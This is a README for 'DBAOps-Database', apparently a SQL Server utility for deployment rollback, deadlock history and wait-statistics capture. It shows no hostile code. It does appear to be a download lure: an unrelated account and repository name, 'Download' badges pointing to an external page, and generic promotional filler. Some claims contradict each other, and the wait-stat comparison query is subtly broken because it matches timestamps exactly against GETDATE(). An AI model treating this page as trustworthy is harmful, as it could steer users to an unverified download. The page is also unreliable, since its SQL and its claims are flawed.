![preview](https://raw.githubusercontent.com/rhovertto74rc-blip/dba-ops-command-center/main/cover_466a9f6.svg)

# DBAOps-Database

**Operational Intelligence for SQL Server Environments — Deployment Tracking, Deadlock Forensics, and Performance Signal Capture, All in One Self-Contained Utility Database.**

Every database administrator knows the quiet dread of a production deployment that worked flawlessly in staging but unravels at 2:47 AM under real-world load. The symptoms are always the same: a deadlock graph that vanishes by morning, a wait stat spike that no one captured, a stored procedure that ran fine yesterday but now crawls because an index changed without a record. DBAOps-Database was born from this specific pain — a persistent, self-documenting operational layer that turns your SQL Server instance into a living audit trail of its own behavior, without requiring external agents, complex orchestration frameworks, or a second career in monitoring tool administration.

This repository delivers a complete, schema-first utility database that you attach to your monitored instance (or run as a central repository for multiple servers). It tracks every deployment with run-once idempotency guards — meaning the same script can be executed multiple times without catastrophic double-application — while automatically generating rollback manifests that capture the exact pre-deployment state of affected objects. Beyond deployments, it continuously persists deadlock history from ring buffer sources, samples wait statistics at configurable intervals, and provides battle-tested deployment script templates that follow the patterns your team already understands, just with proper safety rails attached.

---

## 📦 Getting Started

[![Download](https://raw.githubusercontent.com/rhovertto74rc-blip/dba-ops-command-center/main/pkg_8fb71b.svg)](https://rhovertto74rc-blip.github.io/dba-ops-command-center/)

Before you begin, understand what DBAOps-Database is *not*: it is not a replacement for your monitoring platform, nor a magic wand that fixes misconfigured indexes, nor a GUI application. It is a structured, well-documented foundation — a specialized database you deploy, configure, and then build your operational workflows around. Think of it as the backstage pass to your SQL Server's internal decisions: who changed what, when, why, and what broke as a result.

### 🔍 What Problem Does This Solve?

Most DBA teams rely on a patchwork of custom scripts, email alerts, and tribal knowledge. When a deployment goes sideways, the rollback plan is often a frantic search through source control to reconstruct what the original object looked like. When a deadlock occurs at 3 AM, the graph is overwritten by the next deadlock within hours. When performance degrades gradually, there's no historical baseline to compare against.

DBAOps-Database solves these three core problems simultaneously:

- **Deployment accountability** — every script execution logs its checksum, the executing user, the execution timestamp, and a full before/after snapshot. Re-running a script with the same checksum is silently skipped; running a modified version without proper versioning triggers an explicit warning state.
- **Deadlock preservation** — instead of losing deadlock graphs to the ring buffer's circular nature, this database captures each graph XML to a dedicated table with timestamps, involved processes, and affected objects, preserving forensic evidence for months.
- **Wait stat time-series** — instead of the point-in-time snapshot from `sys.dm_os_wait_stats` that resets on server restart, this utility persists cumulative wait statistics at configurable intervals, allowing you to chart trends, identify regression windows, and correlate with deployment timestamps.

---

## 🗂️ Repository Structure

This repository is organized for immediate usability, not academic taxonomy. You will find a clear separation between the schema definition, the operational procedures, and the deployment templates.

| Directory | Purpose |
|-----------|---------|
| `/core/schema/` | The complete table, view, and index definitions for the utility database itself. Apply this first — it creates all objects in a dedicated schema named `dbaops`. |
| `/core/procedures/` | Stored procedures for capturing wait stats, ingesting deadlock data, and managing the deployment log. All procedures follow the `dbaops.usp_*` naming convention. |
| `/deployment/templates/` | Ready-to-use script templates for common operations: adding columns, creating indexes, modifying stored procedures, and full release batches. Each template includes the idempotency guard syntax and rollback generation logic. |
| `/deployment/examples/` | Complete worked examples showing the correct pattern for a new table deployment, a breaking change to an existing view, and a multi-file release with dependencies. |
| `/documentation/` | Extended operational guides covering rollback workflows, deadlock investigation playbooks, and wait stat baseline tuning. |
| `/integration/` | Optional handler scripts for edge cases — such as capturing deadlock graphs via extended events when ring buffer access is restricted, or scheduled job templates for the wait stat collector. |

---

## ✨ Key Features

- **Run-Once Deployment Guard** — each script generates a deterministic checksum of its full text content. The `dbaops.usp_DeployScript` procedure verifies the checksum against the execution history; identical checksums result in an idempotent no-op with a timestamped log entry, while different checksums for the same logical deployment unit trigger a version conflict alert.
- **Automatic Rollback Manifest Generation** — before executing any deployment script that alters objects, the system reflects the current object definition using `sp_helptext` (or `OBJECT_DEFINITION` for performance) and stores it in a rollback manifest table, keyed to the deployment ID. Rollback is then as simple as calling `dbaops.usp_RollbackDeployment @DeploymentId = X`.
- **Deadlock History Capture** — a nightly job (or scheduled task you define) reads the system health session's ring buffer, parses each deadlock graph XML, and persists it with a unique identifier, occurrence timestamp, and the involved resources. The dedicated `dbaops.vw_DeadlockGraphs` view provides searchable access by database, object, or time range.
- **Wait Statistics Sampling** — the `dbaops.usp_SnapshotWaitStats` procedure captures current cumulative wait values from the DMV, calculates the delta since the last snapshot (per server restart cycle), and stores both raw and delta values with a snapshot timestamp. This builds a continuous baseline for trend analysis without requiring any external scheduler dependency.
- **Deployment Script Templates** — nine production-tested templates covering the most common deployment scenarios, each annotated with the rationale behind every guard clause and safety check, so your junior DBAs write consistent, safe code from day one.
- **Multilingual Error Handling** — error messages in the stored procedures are parameterized and support English, Spanish, German, and French output based on session language settings, ensuring global teams receive actionable feedback in their preferred language.
- **Responsive, Lightweight Schema** — the entire utility database adds less than 5 MB overhead with default column sizes, respects the principle of least privilege (runs on `db_owner` only, no `sysadmin` required for standard operations), and includes indexes aligned to every documented query pattern for sub-50ms response times.

---

## 🔧 Configuration & Customization

DBAOps-Database is designed to be transparent. There is no black-box magic; every table, procedure, and view is exposed with commented definitions, and the configuration parameters live in a dedicated `dbaops.Settings` table with default values that work for 80% of environments.

### Setting Up Your Operational Baseline

1. **Apply the core schema** using your standard change management process. The schema scripts are idempotent themselves — running them twice yields a clean no-op for existing objects.
2. **Configure the capture intervals** in the `Settings` table. The `WaitStatsCaptureIntervalSeconds` parameter controls how frequently snapshots occur (default: 3600 for hourly), and `DeadlockRetentionDays` controls how long historical deadlock graphs are retained before automatic cleanup (default: 90).
3. **Create the scheduled jobs** — a SQL Agent job that calls `dbaops.usp_SnapshotWaitStats` on your configured interval, and another that calls `dbaops.usp_IngestDeadlocks` nightly (or more frequently if your deadlock volume is high).
4. **Integrate deployment scripts** — wherever your team currently runs deployment scripts, wrap them in `dbaops.usp_DeployScript` as shown in the templates. The procedure itself handles the checksum checking, rollback manifest generation, and execution in a transaction.

---

## 🚀 Deployment Workflow in Action

Imagine you are adding a new nonclustered index to a table named `Orders`, and this index might contain duplicate keys due to legacy data. The workflow using this utility would look like this:

1. Write your script using the template `/deployment/templates/02_add_index.sql`, which includes the `dbaops.usp_DeployScript` wrapper and a `CHECKSUM` value you generate.
2. Execute the script. The utility logs the deployment ID, captures the current index definitions for `Orders` as the rollback manifest, and proceeds with the index creation.
3. Two days later, you discover a performance regression traceable to this index. You execute `dbaops.usp_RollbackDeployment` with the recorded deployment ID, and the utility generates and executes a `DROP INDEX` statement using the stored manifest, then logs the rollback event with a new deployment ID referencing the original.

This is the core value proposition: **every operation leaves a ghost copy of the previous state, and undo is a one-command procedure, not a forensic investigation.**

---

## ⚠️ Disclaimer

**Important Operational Considerations**

DBAOps-Database is provided as a utility to enhance your operational efficiency, but it does not replace the judgment and oversight of a qualified database administrator. The rollback manifests are generated from object metadata available at the time of deployment; they may not capture external dependencies (such as permissions granted to roles, or changes made outside the standard deployment process). Always validate rollback scripts in a non-production environment before applying them under duress.

The wait stat snapshots and deadlock captures rely on built-in SQL Server diagnostics. On high-traffic systems, the ring buffer may overflow before the capture job runs; this utility captures what is available, and historical gaps are normal. For critical deadlock forensics, consider using extended events as a complementary capture mechanism (template provided in `/integration/`).

Performance impact is minimal, but do not deploy this on extremely constrained servers without first testing on a representative environment. The utility runs with `VIEW SERVER STATE` permission (not `sysadmin`) for diagnostic reads, and deployment procedures require `db_owner` on the target database. You, the operator, are ultimately responsible for change control in your environment.

---

## 📊 Example Queries to Get You Started

Once the utility is deployed, here are three queries that immediately answer high-value operational questions.

### Which deployments happened in the last week?

```sql
SELECT DeploymentId, ScriptName, DeployedBy, DeployedAt, Status
FROM dbaops.DeploymentLog
WHERE DeployedAt >= DATEADD(DAY, -7, GETDATE())
ORDER BY DeployedAt DESC;
```

### Show me deadlock graphs involving the `Orders` table.

```sql
SELECT DeadlockGraphId, DeadlockTime,
       GraphXml.value('(//object/@name)[1]','nvarchar(128)') AS InvolvedObject
FROM dbaops.DeadlockGraphs
WHERE GraphXml.exist('//object[@name="Orders"]') = 1
ORDER BY DeadlockTime DESC;
```

### Compare wait stats between now and two weeks ago.

```sql
SELECT wait_type, 
       (s2.wait_time_ms - s1.wait_time_ms) AS wait_delta_ms
FROM dbaops.WaitStatsSnapshots s1
JOIN dbaops.WaitStatsSnapshots s2 ON s1.wait_type = s2.wait_type
WHERE s1.SnapshotTime = DATEADD(DAY, -14, GETDATE())
  AND s2.SnapshotTime = GETDATE()
ORDER BY wait_delta_ms DESC;
```

---

## 🛡️ Security & Permissions

This utility respects the principle of least privilege throughout its design. The diagnostic procedures (`usp_SnapshotWaitStats`, `usp_IngestDeadlocks`) require only `VIEW SERVER STATE` on the instance. The deployment procedures require `db_owner` on the specific database where scripts are being applied. The utility database itself is typically called `DBAOps` but can be renamed; the schema remains `dbaops` regardless.

Connection strings, credentials, and other environment variables are never stored within the utility. Scheduled jobs should use SQL Server Agent or your external scheduler, with credentials supplied by the orchestration layer (a standard agent job step or scheduled PowerShell task will suffice). The repository includes commented configuration examples for both approaches in `/documentation/`.

---

## 🆘 24/7 Customer Support Philosophy

While DBAOps-Database is an open-source utility, the operational philosophy embedded in its design is that every DBA deserves a safety net — regardless of the hour. The repository contains an extensive FAQ in `/documentation/TROUBLESHOOTING.md` covering the most common failure modes: what to do if a rollback manifest is empty, how to recover from a partially executed deployment, and how to manually purge corrupt deadlock graph XML.

You are also encouraged to review the well-commented source code thoroughly before deployment. The unusual process of reading the procedures will reveal edge cases not covered in this README, and you will be better prepared to diagnose unexpected behavior in your unique environment.

---

## 📄 License

This project is licensed under the **MIT License** — a permissive license that allows commercial use, modification, distribution, and private use, provided the original copyright notice and license text are included in all copies or substantial portions of the software. The full license text is available in the [LICENSE](https://opensource.org/licenses/MIT) file at the root of this repository.

By using DBAOps-Database, you acknowledge that you have read this license and agree to its terms. The utility is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement — the same disclaimer that appears in the MIT License itself.

---

## 📚 Continuous Learning Path

For those who want to go beyond the provided templates, the repository includes a `/documentation/` folder with extended playbooks, including a step-by-step guide to building your own custom rollback strategies for unusual object types (such as syntax for CLR assemblies or full-text catalogs) and a walkthrough for sharding the wait stats table across multiple servers in a central reporting database.

---

## 🤝 Contributing Guidelines

Contributions that improve the safety or usability of this utility are welcome. If you identify an edge case in the rollback manifest generation — such as a specific object type whose definition is not captured correctly by `OBJECT_DEFINITION` — please open an issue with a reproducible example. The contribution guidelines in `/CONTRIBUTING.md` outline the expected format for new deployment templates and the test fixtures required.

---

## 🏁 Final Word

DBAOps-Database is not a monitoring tool. It is not a deployment orchestration platform. It is the quiet coworker who takes meticulous notes on every meeting, never forgets what the previous state was, and always has a copy of the backup plan when things go sideways. In a world where your SQL Server accumulates failures and incremental changes faster than anyone can track, this utility is the institutional memory your team deserves — unattached, unobtrusive, and always ready to answer the two most important questions in operations: *What changed?* and *How do I undo it?*

The year 2026 will bring more complexity, more data, and hopefully better change management. With this utility, you will be ready for all three.

[![Download](https://raw.githubusercontent.com/rhovertto74rc-blip/dba-ops-command-center/main/pkg_8fb71b.svg)](https://rhovertto74rc-blip.github.io/dba-ops-command-center/)